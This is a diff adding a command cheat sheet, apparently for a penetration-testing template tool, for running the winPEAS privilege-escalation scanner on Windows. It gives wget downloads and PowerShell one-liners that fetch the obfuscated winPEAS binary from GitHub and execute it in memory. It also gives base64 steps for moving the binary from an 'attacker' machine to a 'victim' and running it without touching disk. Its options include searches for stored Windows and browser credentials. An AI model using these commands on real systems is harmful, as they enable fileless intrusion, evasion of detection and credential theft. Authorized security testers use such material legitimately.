@@ -1,0 +1,72 @@
+# refer: https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS/winPEASexe
+
+--- Download
+
+# desc: Any
+wget https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/winPEAS/winPEASexe/binaries/Release/winPEASany.exe
+
+# desc: x64
+wget https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/winPEAS/winPEASexe/binaries/x64/Release/winPEASx64.exe
+
+# desc: x86
+wget https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS/winPEASexe/binaries/x86/Release/winPEASx86.exe
+
+
+--- Quick Start
+
+# desc: One liner to download and execute
+$wp=[System.Reflection.Assembly]::Load([byte[]](Invoke-WebRequest "https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/raw/master/winPEAS/winPEASexe/binaries/Obfuscated%20Releases/winPEASany.exe" -UseBasicParsing | Select-Object -ExpandProperty Content)); [winPEAS.Program]::Main("#{params}")
+
+# desc: Before cmd in 3 lines
+#Put inside the quotes the winpeas parameters you want to use
+$url = "https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/raw/master/winPEAS/winPEASexe/binaries/Release/winPEASany.exe"
+$wp=[System.Reflection.Assembly]::Load([byte[]](Invoke-WebRequest "$url" -UseBasicParsing | Select-Object -ExpandProperty Content));
+[winPEAS.Program]::Main("#{params}") 
+
+# desc: Load from disk in memory and execute
+$wp = [System.Reflection.Assembly]::Load([byte[]]([IO.File]::ReadAllBytes("#{victim_path}")));
+[winPEAS.Program]::Main("#{params}")
+
+# desc: Generate winpeas in Base64:
+# Now upload the B64 string to the victim inside a file or copy it to the clipboard
+[Convert]::ToBase64String([IO.File]::ReadAllBytes("#{attacker_path}")) | Out-File -Encoding ASCII #{attacker_text_path}
+
+# desc: Load Base64 text
+$thecontent = Get-Content -Path #{victim_text_path}
+
+# desc: copied the B64 to the clipboard do
+# Where "aaa..." is the winpeas base64 string
+$thecontent = "aaa..." 
+
+# desc: load B64 in memory and execute
+$wp = [System.Reflection.Assembly]::Load([Convert]::FromBase64String($thecontent))
+[winPEAS.Program]::Main("#{params}")
+
+
+@victim_path.desc(Victim side winPEAS binary Path)
+@victim_text_path.desc(Victim Side WinPEAS Base64 text file Path)
+@attacker_path.desc(Attacker side winPEAS binary Path)
+@attacker_text_path.desc(Attacker side WinPEAS Base64 text file Path)
+
+@params.desc(winPEAS parameters)
+@params.recommend( (run all checks))
+@params.recommend(systeminfo userinfo)
+@params.recommend(domain)
+@params.recommend(debug)
+@params.recommend(log(log output to out.txt instead of standard output))
+
+# quiet                Do not print banner
+# notcolor             Don't use ansi colors (all white)
+# systeminfo           Search system information
+# userinfo             Search user information
+# processinfo          Search processes information
+# servicesinfo         Search services information
+# applicationsinfo     Search installed applications information
+# networkinfo          Search network information
+# windowscreds         Search windows credentials
+# browserinfo          Search browser information
+# filesinfo            Search files that can contains credentials
+# eventsinfo           Display interesting events information
+# wait                 Wait for user input between checks
+# debug                Display debugging information - memory usage, method execution time
+# log                  Log all output to file "out.txt"
